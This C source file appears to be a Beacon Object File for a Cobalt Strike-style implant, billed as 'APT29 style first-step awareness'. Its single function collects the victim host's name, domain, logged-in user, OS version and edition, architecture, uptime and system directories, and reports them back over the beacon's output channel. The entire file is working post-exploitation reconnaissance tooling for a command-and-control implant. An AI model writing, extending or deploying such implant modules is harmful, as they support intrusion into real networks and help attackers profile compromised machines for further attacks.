/*
 * sysinfo.c - System Information (OS, hostname, domain, arch, uptime, build, user, dirs)
 * APT29 style first-step awareness
 */
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI VOID  WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT WINBASEAPI BOOL  WINAPI KERNEL32$GetComputerNameExA(COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL  WINAPI KERNEL32$GetVersionExA(LPOSVERSIONINFOA);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT WINBASEAPI BOOL  WINAPI KERNEL32$GetProductInfo(DWORD, DWORD, DWORD, DWORD, PDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL  WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI UINT  WINAPI KERNEL32$GetWindowsDirectoryA(LPSTR, UINT);
DECLSPEC_IMPORT WINBASEAPI UINT  WINAPI KERNEL32$GetSystemDirectoryA(LPSTR, UINT);

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    char hostname[256] = {0}, domain[256] = {0}, username[256] = {0};
    char winDir[256] = {0}, sysDir[256] = {0};
    DWORD sz = sizeof(hostname), dz = sizeof(domain), uz = sizeof(username);

    KERNEL32$GetComputerNameExA(ComputerNameDnsHostname, hostname, &sz);
    KERNEL32$GetComputerNameExA(ComputerNameDnsDomain, domain, &dz);
    ADVAPI32$GetUserNameA(username, &uz);
    KERNEL32$GetWindowsDirectoryA(winDir, sizeof(winDir));
    KERNEL32$GetSystemDirectoryA(sysDir, sizeof(sysDir));

    OSVERSIONINFOA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    KERNEL32$GetVersionExA(&osvi);

    SYSTEM_INFO si = {0};
    KERNEL32$GetSystemInfo(&si);

    DWORD uptime_ms = KERNEL32$GetTickCount();
    DWORD up_h = (uptime_ms / 1000) / 3600;
    DWORD up_m = ((uptime_ms / 1000) % 3600) / 60;

    DWORD prodType = 0;
    KERNEL32$GetProductInfo(osvi.dwMajorVersion, osvi.dwMinorVersion, 0, 0, &prodType);

    const char* arch = "Unknown";
    if (si.wProcessorArchitecture == 9) arch = "x64 (AMD64)";
    else if (si.wProcessorArchitecture == 0) arch = "x86";

    const char* osName = "Unknown";
    if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0) {
        if (osvi.dwBuildNumber >= 22000) osName = "Windows 11";
        else osName = "Windows 10";
    } else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3) osName = "Windows 8.1";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2) osName = "Windows 8";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) osName = "Windows 7";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0) osName = "Windows Vista";

    const char* prod = "Unknown";
    switch (prodType) {
        case 1: prod = "Business"; break;
        case 6: prod = "Enterprise"; break;
        case 48: prod = "Pro"; break;
        case 101: prod = "Home"; break;
        case 121: prod = "Education"; break;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Hostname      : %s", hostname);
    BeaconPrintf(CALLBACK_OUTPUT, "Domain        : %s", domain[0] ? domain : "(none)");
    BeaconPrintf(CALLBACK_OUTPUT, "Username      : %s", username);
    BeaconPrintf(CALLBACK_OUTPUT, "OS            : %s (%lu.%lu.%lu)", osName, osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    BeaconPrintf(CALLBACK_OUTPUT, "Edition       : %s (0x%lX)", prod, prodType);
    BeaconPrintf(CALLBACK_OUTPUT, "Architecture  : %s", arch);
    BeaconPrintf(CALLBACK_OUTPUT, "Processors    : %lu", si.dwNumberOfProcessors);
    BeaconPrintf(CALLBACK_OUTPUT, "Uptime        : %luh %lum", up_h, up_m);
    BeaconPrintf(CALLBACK_OUTPUT, "Windows Dir   : %s", winDir);
    BeaconPrintf(CALLBACK_OUTPUT, "System Dir    : %s", sysDir);
}
